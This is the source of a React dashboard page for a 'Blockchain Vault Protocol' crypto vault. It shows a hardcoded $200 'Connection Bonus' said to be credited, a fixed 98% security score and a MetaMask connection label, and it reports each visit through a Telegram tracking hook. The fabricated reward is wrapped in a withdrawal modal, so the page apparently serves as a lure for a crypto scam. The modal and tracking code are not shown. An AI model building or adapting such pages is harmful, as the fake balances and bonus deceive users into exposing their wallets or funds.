"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import {
  Wallet,
  Shield,
  TrendingUp,
  Gift,
  Eye,
  EyeOff,
  ArrowUpRight,
  ArrowDownLeft,
  Settings,
  LogOut,
} from "lucide-react"
import { useTelegramTracking } from "@/hooks/use-telegram-tracking"
import { WithdrawalModal } from "@/components/withdrawal-modal"

export default function Dashboard() {
  const [balanceVisible, setBalanceVisible] = useState(true)
  const [mounted, setMounted] = useState(false)

  const { trackVisit } = useTelegramTracking()

  useEffect(() => {
    setMounted(true)
    trackVisit()
  }, [trackVisit])

  if (!mounted) return null

  return (
    <div className="min-h-screen bg-background text-foreground">
      {/* Header */}
      <header className="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div className="w-8 h-8 bg-primary rounded-lg flex items-center justify-center">
                <Shield className="w-5 h-5 text-primary-foreground" />
              </div>
              <div>
                <h1 className="text-xl font-bold font-sans">
                  <span className="hidden sm:inline">BLOCKCHAIN VAULT PROTOCOL</span>
                  <span className="sm:hidden">BVP</span>
                </h1>
                <p className="text-sm text-muted-foreground font-mono">Dashboard</p>
              </div>
            </div>
            <div className="flex items-center space-x-2">
              <Button variant="outline" size="sm">
                <Settings className="w-4 h-4 mr-2" />
                Settings
              </Button>
              <Button variant="outline" size="sm">
                <LogOut className="w-4 h-4 mr-2" />
                Disconnect
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        {/* Welcome Banner */}
        <div className="mb-8 p-6 bg-gradient-to-r from-primary/10 to-primary/5 rounded-xl border border-primary/20">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-2xl font-bold font-sans mb-2">Welcome to Your Vault</h2>
              <p className="text-muted-foreground font-mono">Your secure cryptocurrency vault is now active</p>
            </div>
            <Badge className="bg-primary/20 text-primary border-primary/30">
              <Gift className="w-4 h-4 mr-1" />
              Connection Bonus
            </Badge>
          </div>
        </div>

        {/* Balance Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
          {/* Vault Balance */}
          <Card className="bg-card border-border">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium font-mono">Vault Balance</CardTitle>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setBalanceVisible(!balanceVisible)}
                className="h-8 w-8 p-0"
              >
                {balanceVisible ? <Eye className="w-4 h-4" /> : <EyeOff className="w-4 h-4" />}
              </Button>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold font-sans">{balanceVisible ? "$0.00" : "••••••"}</div>
              <p className="text-xs text-muted-foreground font-mono">0.00000000 BTC</p>
            </CardContent>
          </Card>

          {/* Connection Bonus */}
          <WithdrawalModal>
            <Card className="bg-card border-border border-primary/30 cursor-pointer hover:bg-primary/5 transition-colors group">
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium font-mono group-hover:text-primary transition-colors">
                  Connection Bonus
                </CardTitle>
                <Gift className="w-4 h-4 text-primary group-hover:scale-110 transition-transform" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold font-sans text-primary">
                  {balanceVisible ? "$200.00" : "••••••"}
                </div>
                <p className="text-xs text-muted-foreground font-mono">Welcome reward credited</p>
              </CardContent>
            </Card>
          </WithdrawalModal>

          {/* Security Score */}
          <Card className="bg-card border-border">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium font-mono">Security Score</CardTitle>
              <Shield className="w-4 h-4 text-green-500" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold font-sans text-green-500">98%</div>
              <p className="text-xs text-muted-foreground font-mono">Excellent security level</p>
            </CardContent>
          </Card>
        </div>

        {/* Quick Actions */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <Card className="bg-card border-border">
            <CardHeader>
              <CardTitle className="font-sans">Quick Actions</CardTitle>
              <CardDescription className="font-mono">Manage your vault assets</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <Button className="w-full justify-start bg-transparent" variant="outline">
                <ArrowDownLeft className="w-4 h-4 mr-2" />
                Deposit Assets
              </Button>
              <Button className="w-full justify-start bg-transparent" variant="outline">
                <ArrowUpRight className="w-4 h-4 mr-2" />
                Withdraw Assets
              </Button>
              <Button className="w-full justify-start bg-transparent" variant="outline">
                <TrendingUp className="w-4 h-4 mr-2" />
                View Analytics
              </Button>
            </CardContent>
          </Card>

          <Card className="bg-card border-border">
            <CardHeader>
              <CardTitle className="font-sans">Vault Status</CardTitle>
              <CardDescription className="font-mono">Current vault information</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex items-center justify-between">
                <span className="text-sm font-mono">Status</span>
                <Badge className="bg-green-500/20 text-green-500 border-green-500/30">Active</Badge>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm font-mono">Connected Wallet</span>
                <span className="text-sm font-mono text-muted-foreground">MetaMask</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm font-mono">Last Activity</span>
                <span className="text-sm font-mono text-muted-foreground">Just now</span>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Recent Activity */}
        <Card className="bg-card border-border">
          <CardHeader>
            <CardTitle className="font-sans">Recent Activity</CardTitle>
            <CardDescription className="font-mono">Your latest vault transactions</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="text-center py-8">
              <Wallet className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
              <h3 className="text-lg font-semibold font-sans mb-2">No Activity Yet</h3>
              <p className="text-sm text-muted-foreground font-mono mb-4">Start by depositing assets to your vault</p>
              <Button>
                <ArrowDownLeft className="w-4 h-4 mr-2" />
                Make Your First Deposit
              </Button>
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
